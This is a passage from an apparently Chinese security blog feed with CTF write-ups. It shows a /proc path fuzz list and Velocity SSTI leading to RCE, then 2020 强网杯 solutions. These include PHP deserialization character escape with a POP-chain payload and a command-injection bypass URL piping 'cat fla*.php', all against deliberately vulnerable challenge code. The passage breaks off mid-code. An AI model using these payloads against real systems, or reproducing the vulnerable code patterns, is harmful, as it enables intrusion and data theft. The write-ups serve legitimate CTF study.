alt="mark"></p><p>尝试读取/flag、/flag.txt均不行。读取/proc/self目录下的文件</p><p>从其他师傅博客里看到的fuzz字典：</p><pre><code>/proc/self/cmdline/proc/self/stat/proc/self/status/proc/self/environ/proc/verison/proc/cmdline/proc/self/cwd/proc/self/fd/0/proc/self/fd/1/proc/self/fd/2/proc/self/fd/3/proc/self/fd/4/proc/self/fd/5/proc/self/fd/6/proc/self/fd/7/proc/self/fd/8/proc/self/fd/9/proc/self/fd/10/proc/self/fd/11/proc/self/fd/12/proc/self/fd/13/proc/self/fd/14/proc/self/fd/15/proc/self/fd/16/proc/self/fd/17/proc/self/fd/18/proc/self/fd/19/proc/self/fd/20/proc/self/fd/21/proc/self/fd/22/proc/self/fd/23/proc/self/fd/24/proc/self/fd/25/proc/self/fd/26/proc/self/fd/27/proc/self/fd/28/proc/self/fd/29/proc/self/fd/30/proc/self/fd/31/proc/self/fd/32/proc/self/fd/33/proc/self/fd/34/proc/self/fd/35/proc/sched_debug/proc/mounts/proc/net/arp/proc/net/route/proc/net/tcp/proc/net/udp/proc/net/fib_trie/proc/version</code></pre><p>在/proc/self/cmdline发现当前运行的web jar包</p><p><img src="http://pic.c1imber.top/blog/20200828/ja16S1KRHrQC.png?imageslim" alt="mark"></p><p>/home/ctf/web/target/web-1.0-SNAPSHOT-jar-with-dependencies.jar</p><p>但是下载不下来</p><p>后来发现了关键的源码</p><p>/home/ctf/web/src/main/java/Blog.java</p><p><img src="http://pic.c1imber.top/blog/20200828/EpFBv1kxesTb.png?imageslim" alt="mark"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> <span class="keyword">static</span> spark.Spark.*;</div><div class="line"><span class="keyword">import</span> java.io.*;</div><div class="line"><span class="keyword">import</span> org.apache.velocity.Template;</div><div class="line"><span class="keyword">import</span> org.apache.velocity.VelocityContext;</div><div class="line"><span class="keyword">import</span> org.apache.velocity.app.VelocityEngine;</div><div class="line"><span class="keyword">import</span> spark.template.velocity.VelocityTemplateEngine;</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">import</span> java.io.StringWriter;</div><div class="line"></div><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Blog</span> </span>&#123;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(String fname, String content)</span> </span>&#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            FileWriter writer = <span class="keyword">new</span> FileWriter(fname, <span class="keyword">true</span>);</div><div class="line">            writer.write(content);</div><div class="line">            writer.close();</div><div class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] arg)</span> </span>&#123;</div><div class="line">        staticFiles.location(<span class="string">"/public"</span>);</div><div class="line"></div><div class="line">        VelocityEngine velocityEngine = <span class="keyword">new</span> VelocityEngine();</div><div class="line">        velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, <span class="string">"file"</span>);</div><div class="line">        velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, <span class="string">"/"</span>);</div><div class="line">        velocityEngine.init();</div><div class="line">        VelocityContext context = <span class="keyword">new</span> VelocityContext();</div><div class="line"></div><div class="line">        get(<span class="string">"/"</span>, (request, response) -&gt; &#123;</div><div class="line">            request.session(<span class="keyword">true</span>);</div><div class="line">            String title = request.queryParams(<span class="string">"title"</span>);</div><div class="line">            <span class="keyword">if</span> (title != <span class="keyword">null</span>) &#123;</div><div class="line">                log(<span class="string">"/tmp/"</span> + request.session().id(), <span class="string">"Client IP: "</span> + request.ip() + <span class="string">" -&gt; File: "</span> + title + <span class="string">"\n"</span>);</div><div class="line">                Template template = velocityEngine.getTemplate(<span class="string">"/home/ctf/web/src/main/resources/templates/"</span> + title);</div><div class="line">                StringWriter sw = <span class="keyword">new</span> StringWriter();</div><div class="line">                template.merge(context, sw);</div><div class="line">                <span class="keyword">return</span> sw;</div><div class="line">            &#125;</div><div class="line">            Template template = velocityEngine.getTemplate(<span class="string">"/home/ctf/web/src/main/resources/templates/index"</span>);</div><div class="line">            StringWriter sw = <span class="keyword">new</span> StringWriter();</div><div class="line">            template.merge(context, sw);</div><div class="line">            <span class="keyword">return</span> sw;</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>X-Forwarded-For头的位置存在ssti</p><p><img src="http://pic.c1imber.top/blog/20200828/1s9kmIDPRPrN.png?imageslim" alt="mark"></p><p>可以直接rce，直接用solr那个rce payload就可以成功</p><p><img src="http://pic.c1imber.top/blog/20200828/bj7HD4Yma9aM.png?imageslim" alt="mark"></p><p>获取flag</p><p><img src="http://pic.c1imber.top/blog/20200828/y95IWbp35WRC.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;easyweb&quot;&gt;&lt;a href=&quot;#easyweb&quot; class=&quot;headerlink&quot; title=&quot;easyweb&quot;&gt;&lt;/a&gt;easyweb&lt;/h3&gt;&lt;p&gt;php命令执行无回显、不出网、web目录不可写&lt;/p&gt;
&lt;p&gt;通过&lt;code&gt;php -r &amp;quo
      
    
    </summary>
    
      <category term="ctf" scheme="https://c1aysec.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://c1aysec.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2020强网杯writeup</title>
    <link href="https://c1aysec.github.io/2020/08/24/2020%E5%BC%BA%E7%BD%91%E6%9D%AFwriteup/"/>
    <id>https://c1aysec.github.io/2020/08/24/2020强网杯writeup/</id>
    <published>2020-08-24T08:28:12.524Z</published>
    <updated>2020-08-25T09:41:40.579Z</updated>
    
    <content type="html"><![CDATA[<p>没做出几道题，记录一下吧，周末两天的做题还是有收获的</p><h1 id="强网先锋"><a href="#强网先锋" class="headerlink" title="强网先锋"></a>强网先锋</h1><h3 id="web辅助"><a href="#web辅助" class="headerlink" title="web辅助"></a>web辅助</h3><p><img src="http://pic.c1imber.top/blog/20200824/7xfowRDckelN.png?imageslim" alt="mark"></p><p>题目直接给了源码</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">@error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">require_once</span> <span class="string">"common.php"</span>;</div><div class="line"><span class="keyword">require_once</span> <span class="string">"class.php"</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))&#123;</div><div class="line">$username = $_GET[<span class="string">'username'</span>];</div><div class="line">$password = $_GET[<span class="string">'password'</span>];</div><div class="line">$player = <span class="keyword">new</span> player($username, $password);</div><div class="line">file_put_contents(<span class="string">"caches/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]), write(serialize($player))); </div><div class="line"><span class="keyword">echo</span> sprintf(<span class="string">'Welcome %s, your ip is %s\n'</span>, $username, $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"Please input the username or password!\n"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>play.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">@error_reporting(<span class="number">0</span>);</div><div class="line"><span class="keyword">require_once</span> <span class="string">"common.php"</span>;</div><div class="line"><span class="keyword">require_once</span> <span class="string">"class.php"</span>;</div><div class="line"></div><div class="line">@$player = unserialize(read(check(file_get_contents(<span class="string">"caches/"</span>.md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>])))));</div><div class="line">print_r($player);</div><div class="line"><span class="keyword">if</span> ($player-&gt;get_admin() === <span class="number">1</span>)&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"FPX Champion\n"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line"><span class="keyword">echo</span> <span class="string">"The Shy unstoppable\n"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">player</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $user;</div><div class="line">    <span class="keyword">protected</span> $pass;</div><div class="line">    <span class="keyword">protected</span> $admin;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $pass, $admin = <span class="number">0</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;user = $user;</div><div class="line">        <span class="keyword">$this</span>-&gt;pass = $pass;</div><div class="line">        <span class="keyword">$this</span>-&gt;admin = $admin;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_admin</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;admin;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">'Riven'</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = $name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">TP</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span> (gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">"function"</span> <span class="keyword">or</span> gettype(<span class="keyword">$this</span>-&gt;name) === <span class="string">"object"</span>)&#123;</div><div class="line">            $name = <span class="keyword">$this</span>-&gt;name;</div><div class="line">            $name();</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;TP();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = $name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;name !== <span class="string">'Yasuo'</span>)&#123;</div><div class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">'Yasuo'</span>;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"No Yasuo! No Soul!\n"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;Gank();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Gank</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;name, <span class="string">'Yasuo'</span>))&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Are you orphan?\n"</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">"Must Be Yasuo!\n"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name = <span class="string">""</span>;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">"Lee Sin"</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = $name;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">KS</span><span class="params">()</span></span>&#123;</div><div class="line">        system(<span class="string">"cat /flag"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;KS();  </div><div class="line">        <span class="keyword">return</span> <span class="string">""</span>;  </div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>common.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">($data)</span></span>&#123;</div><div class="line">    $data = str_replace(<span class="string">'\0*\0'</span>, chr(<span class="number">0</span>).<span class="string">"*"</span>.chr(<span class="number">0</span>), $data);</div><div class="line">    <span class="keyword">return</span> $data;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($data)</span></span>&#123;</div><div class="line">    $data = str_replace(chr(<span class="number">0</span>).<span class="string">"*"</span>.chr(<span class="number">0</span>), <span class="string">'\0*\0'</span>, $data);</div><div class="line">    <span class="keyword">return</span> $data;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($data)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">if</span>(stristr($data, <span class="string">'name'</span>)!==<span class="keyword">False</span>)&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"Name Pass\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">return</span> $data;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>主要代码及功能：<br>index.php接收传入的<code>$_GET[&#39;username&#39;]</code>和<code>$_GET[&#39;password&#39;]</code>变量，创建player对象，经过serialize序列化后写入<code>&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])</code>文件</p><p>play.php读取<code>&quot;caches/&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;])</code>文件内容，将文件中序列化字符串进行反序列化，打印</p><p>class.php当中定义了一些类，并存在可利用的反序列化pop链</p><p>common.php主要对序列化和反序列化的数据流进行一些检查和处理</p><p>正常情况下，写入文件的序列化内容是不可控的，但是这里由于common.php当中的read函数会在字符串反序列化之前将序列化字符串当中的<code>\0*\0</code>替换为<code>chr(0).&quot;*&quot;.chr(0)</code>，从5个字符变成了3个字符，导致处理后的字符串在反序列化时，字符串属性值长度大于实际的长度，产生字符逃逸，导致之后的序列化字符串内容可控</p><p>字符逃逸测试，尝试将player的<code>$admin</code>属性值变成1，该值本来是不可控的，这里尝试通过字符逃逸将其变为可控</p><p><img src="http://pic.c1imber.top/blog/20200824/yvHWtwz0yeOG.png?imageslim" alt="mark"></p><p>传入：</p><pre><code>username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&amp;password=&quot;;s:7:&quot;\0*\0pass&quot;;s:3:&quot;111&quot;;s:8:&quot;\0*\0admin&quot;;i:1;}</code></pre><p>可以看到$admin的值被改变为了1，输出FPX Champion</p><p><img src="http://pic.c1imber.top/blog/20200824/xtRsQDnVI4lz.png?imageslim" alt="mark"></p><p>文件当中的序列化字符串：</p><pre><code>O:6:&quot;player&quot;:3:{s:7:&quot;\0*\0user&quot;;s:55:&quot;\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&quot;;s:7:&quot;\0*\0pass&quot;;s:50:&quot;&quot;;s:7:&quot;\0*\0pass&quot;;s:3:&quot;111&quot;;s:8:&quot;\0*\0admin&quot;;i:1;}&quot;;s:8:&quot;\0*\0admin&quot;;i:0;}</code></pre><p>经过read函数处理后（为了方便表示，这里protected属性名中的不可见字符用0表示）</p><pre><code>O:6:&quot;player&quot;:3:{s:7:&quot;0*0user&quot;;s:55:&quot;0*00*00*00*00*00*00*00*00*00*00*0&quot;;s:7:&quot;0*0pass&quot;;s:50:&quot;&quot;;s:7:&quot;0*0pass&quot;;s:3:&quot;111&quot;;s:8:&quot;0*0admin&quot;;i:1;}&quot;;s:8:&quot;0*0admin&quot;;i:0;}</code></pre><p><code>\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0</code></p><p>由长度55变为了</p><p><code>0*00*00*00*00*00*00*00*00*00*00*0长度33</code></p><p><code>&quot;;s:7:&quot;0*0pass&quot;;s:50:&quot;</code>为逃逸的字符，长度为55-33，22</p><p>逃逸的字符之后的序列化字符串就变为可控内容了，可以通过$_GET[‘password’]构造可控的序列化字符串</p><p>php序列化字符串遇到}后完成反序列化，实际反序列化字符串为</p><pre><code>O:6:&quot;player&quot;:3：{s:7:&quot;0*0user&quot;;s:55:&quot;0*00*00*00*00*00*00*00*00*00*00*0&quot;;s:7:&quot;0*0pass&quot;;s:50:&quot;&quot;;s:7:&quot;0*0pass&quot;;s:3:&quot;111&quot;;s:8:&quot;0*0admin&quot;;i:1;}object(__PHP_Incomplete_Class)#1 (4) { [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt; string(6) &quot;player&quot; [&quot;user&quot;:protected]=&gt; string(55) &quot;***********&quot;;s:7:&quot;*pass&quot;;s:50:&quot;&quot; [&quot;pass&quot;:protected]=&gt; string(3) &quot;111&quot; [&quot;admin&quot;:protected]=&gt; int(1) }</code></pre><p>根据class.php构造pop链</p><p>最终需要触发的地方为jungle对象的KS方法当中的<code>system(&#39;cat /flag&#39;)</code>-&gt;</p><p>jungle对象的<code>__toString</code>魔术方法刚好调用了KS方法-&gt;</p><p><code>__toString</code>魔术方法在对象被当作字符串时触发，所以需要找到一个jungle对象有可能被当作字符串的位置-&gt;</p><p>在midsolo对象的Gank方法当中，使用了stristr字符串函数，如果将这里midsolo对象的$name属性设置为jungle对象，就可以触发jungle的<code>__toString</code>-&gt;</p><p>midsolo对象的<code>__invoke</code>魔术方法刚好调用了Gank方法，<code>__invoke</code>魔术方法在其对象被作为函数调用时触发-&gt;</p><p>很容易可以找到topsolo对象的TP方法，这里调用了<code>$name()</code>，如果将topsolo对象的$name属性设置为midsolo对象，就能触发midsolo的<code>__invoke</code>-&gt;</p><p>而刚好topsolo的<code>__destruct</code>调用了topsolo的TP方法，所以这里可以作为pop链的起点</p><p>构造poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">jungle</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name = <span class="string">""</span>;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">"Lee Sin"</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = $name;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">midsolo</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name=<span class="string">""</span>;</div><div class="line">    </div><div class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> jungle();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">topsolo</span></span>&#123;</div><div class="line">    <span class="keyword">protected</span> $name=<span class="string">""</span>;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name = <span class="string">""</span>)</span></span>&#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;name = <span class="keyword">new</span> midsolo();</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$obj=<span class="keyword">new</span> topsolo();</div><div class="line"><span class="keyword">echo</span> serialize($obj);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><pre><code>O:7:&quot;topsolo&quot;:1:{s:7:&quot;*name&quot;;O:7:&quot;midsolo&quot;:1:{s:7:&quot;*name&quot;;O:6:&quot;jungle&quot;:1:{s:7:&quot;*name&quot;;s:7:&quot;Lee Sin&quot;;}}}</code></pre><p>修改payload</p><p>1、存在不可见字符，修改成</p><pre><code>O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00name&quot;;O:7:&quot;midsolo&quot;:1:{S:7:&quot;\00*\00name&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00name&quot;;s:7:&quot;Lee Sin&quot;;}}}</code></pre><p>2、midsolo的<code>__walkup</code>方法要求$name必须为Yasuo，所以需要绕过<code>__walkup</code>方法<br>改为：</p><pre><code>O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00name&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;\00*\00name&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00name&quot;;s:7:&quot;Lee Sin&quot;;}}}</code></pre><p>3、common.php当中的check函数要求序列化字符串当中不能存在name</p><p>把n改为\6e</p><pre><code>O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00\6eame&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;\00*\00\6eame&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00\6eame&quot;;s:7:&quot;Lee Sin&quot;;}}}</code></pre><p>最终传入</p><pre><code>username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&amp;password=;s:8:&quot;\0*\0admin&quot;;i:1;S:7:&quot;\00*\00\6eame&quot;;O:7:&quot;topsolo&quot;:1:{S:7:&quot;\00*\00\6eame&quot;;O:7:&quot;midsolo&quot;:2:{S:7:&quot;\00*\00\6eame&quot;;O:6:&quot;jungle&quot;:1:{S:7:&quot;\00*\00\6eame&quot;;s:7:&quot;Lee Sin&quot;;}}}}</code></pre><p><img src="http://pic.c1imber.top/blog/20200824/d8wxX2yFHQU2.png?imageslim" alt="mark"></p><p>访问play.php获取flag</p><p><img src="http://pic.c1imber.top/blog/20200824/5HLVOwJA1qKC.png?imageslim" alt="mark"></p><h3 id="主动"><a href="#主动" class="headerlink" title="主动"></a>主动</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">highlight_file(<span class="string">"index.php"</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/i"</span>, $_GET[<span class="string">"ip"</span>]))</div><div class="line">&#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">"no flag"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line">system(<span class="string">"ping -c 3 $_GET[ip]"</span>);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p>preg_match检查<code>$_GET[&quot;ip&quot;]</code>当中不能有flag字符串，直接用linux通配符就能绕过</p><p><code>http://xxx/?ip=1.1.1.1%20||%20cat%20fla*.php</code></p><p><img src="http://pic.c1imber.top/blog/20200824/piMpGWj02C6D.png?imageslim" alt="mark"></p><h3 id="Funhash"><a href="#Funhash" class="headerlink" title="Funhash"></a>Funhash</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span> <span class="string">'conn.php'</span>;</div><div class="line">highlight_file(<span class="string">"index.php"</span>);</div><div class="line"><span class="comment">//level 1</span></div><div class="line"><span class="keyword">if</span> ($_GET[<span class="string">"hash1"</span>] != 